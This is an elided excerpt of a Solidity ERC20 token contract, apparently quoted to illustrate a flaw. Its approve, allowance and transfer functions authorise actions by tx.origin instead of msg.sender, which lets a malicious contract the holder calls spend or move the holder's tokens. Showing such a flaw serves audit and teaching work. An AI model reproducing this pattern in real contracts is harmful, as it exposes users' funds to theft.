...
contract ERC20Clonable {
    ...
    function approve(address spender, uint wad) public virtual returns (bool) {
        return _approve(tx.origin, spender, wad);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(tx.origin, spender, _allowance[tx.origin][spender] + addedValue);
        return true;
    }
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        ...
        _approve(tx.origin, spender, currentAllowance - subtractedValue);

        return true;
    }

    function transfer(address dst, uint wad) public virtual returns (bool) {
        return _transfer(tx.origin, dst, wad);
    }
